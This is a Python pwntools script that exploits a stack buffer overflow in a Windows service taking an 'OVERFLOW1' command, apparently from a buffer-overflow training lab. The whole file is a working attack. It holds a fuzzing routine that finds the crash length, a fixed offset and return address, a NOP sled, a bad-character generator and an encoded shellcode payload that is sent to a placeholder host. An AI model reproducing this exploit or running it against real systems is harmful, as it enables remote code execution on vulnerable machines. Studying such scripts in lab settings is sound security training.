#!/usr/bin/env python

from pwn import *

context.update(arch='i386', os='windows')

rhost = "some_host"
rport = 1337

prefix = "OVERFLOW1 "
offset = 1978
overflow = "A" * offset
retn = "\x03\x12\x50\x62"
padding = "\x90" * 16
#  payload = "\x01\x02\x03\x04\x05\x06\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
payload = "\xb8\xc0\x94\xb2\x8d\xdb\xd3\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x5b\x83\xeb\xfc\x31\x43\x10\x03\x43\x10\x22\x61\x4e\x65\x20\x8a\xaf\x76\x44\x02\x4a\x47\x44\x70\x1e\xf8\x74\xf2\x72\xf5\xff\x56\x67\x8e\x8d\x7e\x88\x27\x3b\x59\xa7\xb8\x17\x99\xa6\x3a\x65\xce\x08\x02\xa6\x03\x48\x43\xda\xee\x18\x1c\x91\x5d\x8d\x29\xef\x5d\x26\x61\xfe\xe5\xdb\x32\x01\xc7\x4d\x48\x58\xc7\x6c\x9d\xd1\x4e\x77\xc2\xdf\x19\x0c\x30\x94\x9b\xc4\x08\x55\x37\x29\xa5\xa4\x49\x6d\x02\x56\x3c\x87\x70\xeb\x47\x5c\x0a\x37\xcd\x47\xac\xbc\x75\xac\x4c\x11\xe3\x27\x42\xde\x67\x6f\x47\xe1\xa4\x1b\x73\x6a\x4b\xcc\xf5\x28\x68\xc8\x5e\xeb\x11\x49\x3b\x5a\x2d\x89\xe4\x03\x8b\xc1\x09\x50\xa6\x8b\x45\x95\x8b\x33\x96\xb1\x9c\x40\xa4\x1e\x37\xcf\x84\xd7\x91\x08\x9c\xff\x21\xc6\x26\x6f\xdc\xe7\x56\xa6\x1b\xb3\x06\xd0\x8a\xbc\xcc\x20\x32\x69\x78\x2a\xa4\x52\xd5\x12\x35\x3b\x24\x62\x24\xe7\xa1\x84\x16\x47\xe2\x18\xd7\x37\x42\xc8\xbf\x5d\x4d\x37\xdf\x5d\x87\x50\x4a\xb2\x7e\x09\xe3\x2b\xdb\xc1\x92\xb4\xf1\xac\x95\x3f\xf0\x51\x5b\xc8\x71\x41\x8c\xaf\x79\x99\x4d\x5a\x7a\xf3\x49\xcc\x2d\x6b\x50\x29\x19\x34\xab\x1c\x19\x32\x53\xe1\x28\x49\x62\x77\x15\x25\x8b\x97\x95\xb5\xdd\xfd\x95\xdd\xb9\xa5\xc5\xf8\xc5\x73\x7a\x51\x50\x7c\x2b\x06\xf3\x14\xd1\x71\x33\xbb\x2a\x54\x47\xbc\xd5\x2b\x60\x65\xbe\xd3\x30\x95\x3e\xb9\xb0\xc5\x56\x36\x9e\xea\x96\xb7\x35\xa3\xbe\x32\xd8\x01\x5e\x43\xf1\xc4\xfe\x44\xf6\xdc\xf1\x3f\x77\xe2\xf1\xc0\x91\x87\xf1\xc1\x9d\xb9\xce\x14\xa4\xcf\x11\xa5\x93\xd0\x8f\x03\xee\x78\x16\xc6\x53\xe5\xa9\x3d\x97\x10\x2a\xb7\x68\xe7\x32\xb2\x6d\xa3\xf4\x2f\x1c\xbc\x90\x4f\xb3\xbd\xb0"
postfix = ""

def find_overflow(start, step):
    r = remote(rhost, rport)
    i = start
    while True:
        pattern = cyclic(i, alphabet=string.ascii_uppercase)
        r.send("OVERFLOW1 " + pattern)
        output_command = r.recvline()
        i += step
        if not r.can_recv(1):
            print("Pattern (len = " + str(i) + "): " + pattern)
            r.close()
            return


def exploit():
    expl = prefix + overflow + retn + padding + payload + postfix

    r = remote(rhost, rport)
    r.send(expl)
    output = r.recvline()

    r.close()
    print(output.decode("utf-8"))

def generate_bad_chars():
    for x in range(1,256):
        print("\\x" + "{:02x}".format(x), end='')

    print()


#  find_overflow(50, 100)
exploit()
